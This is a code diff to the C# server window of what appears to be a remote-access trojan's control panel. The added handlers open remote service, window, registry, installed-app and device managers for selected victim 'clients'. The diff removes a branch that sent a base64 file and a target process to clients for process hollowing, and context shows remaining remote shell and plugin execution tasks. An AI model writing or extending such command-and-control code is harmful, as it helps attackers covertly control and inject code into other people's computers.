@@ -723,6 +723,73 @@ public partial class ServerWindow : Window
         }
     }
 
+    // ── New feature window handlers ──────────────────────────────────────────
+
+    private async void ServiceManager_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<ServiceManagerWindow>(c.Id, () => new ServiceManagerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+        Log($"[*] Service Manager opened for {clients.Count} client(s).");
+    }
+
+    private async void WindowManager_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<WindowManagerWindow>(c.Id, () => new WindowManagerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+        Log($"[*] Window Manager opened for {clients.Count} client(s).");
+    }
+
+    private async void RegistryEditor_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<RegistryEditorWindow>(c.Id, () => new RegistryEditorWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+        Log($"[*] Registry Editor opened for {clients.Count} client(s).");
+    }
+
+    private async void InstalledApps_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<InstalledAppsWindow>(c.Id, () => new InstalledAppsWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+        Log($"[*] Installed Apps opened for {clients.Count} client(s).");
+    }
+
+    private async void DeviceManager_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<DeviceManagerWindow>(c.Id, () => new DeviceManagerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+        Log($"[*] Device Manager opened for {clients.Count} client(s).");
+    }
+
+    private void SelectAll_Click(object sender, RoutedEventArgs e)
+    {
+        GridClients.SelectAll();
+    }
+
     private TikTokWindow? _tikTokWindow;
     private void TikTok_Click(object sender, RoutedEventArgs e)
     {
@@ -2908,20 +2975,6 @@ Read-Host 'Press Enter to close'
                     {
                         Type = Protocol.PacketType.AutoTaskShell,
                         Data = task.ShellCommand
-                    };
-                }
-                else if (task.Type == Data.AutoTaskType.HollowExec)
-                {
-                    var data = new Protocol.HollowExecData
-                    {
-                        FileName = task.FileName,
-                        FileBase64 = task.FileBase64,
-                        TargetProcess = task.HollowTarget
-                    };
-                    packet = new Protocol.Packet
-                    {
-                        Type = Protocol.PacketType.HollowExec,
-                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                     };
                 }
                 else if (task.Type == Data.AutoTaskType.PluginExec)
